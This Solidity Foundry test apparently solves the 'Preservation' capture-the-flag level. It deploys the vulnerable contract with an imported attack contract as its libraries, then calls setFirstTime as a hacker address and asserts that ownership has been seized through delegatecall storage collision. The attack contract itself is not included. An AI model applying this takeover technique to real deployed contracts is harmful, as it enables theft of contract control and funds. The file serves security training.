pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "forge-std/console.sol";
import {AttackContract, Preservation} from "../src/Preservation.sol";


/** 
 * 解题思路：delegatecall 调用合约时，实际的数据
 */
contract HackPreservationTest is Test {
    address hacker = address(1111111111111111);
    AttackContract public ac;
    Preservation public p;

    function setUp() public {
        vm.deal(hacker, 1 ether);
        ac = new AttackContract();
        p = new Preservation(address(ac), address(ac));
    }
    function testHackPreservation() public {
        vm.startPrank(hacker);
        
        console.log("before hacker, owner address:");
        console.logAddress(p.owner());
        p.setFirstTime(1234567999);

        console.log("after hacker, owner address:");
        console.logAddress(p.owner());
        assert(p.owner() == hacker);
        vm.stopPrank();
    }
}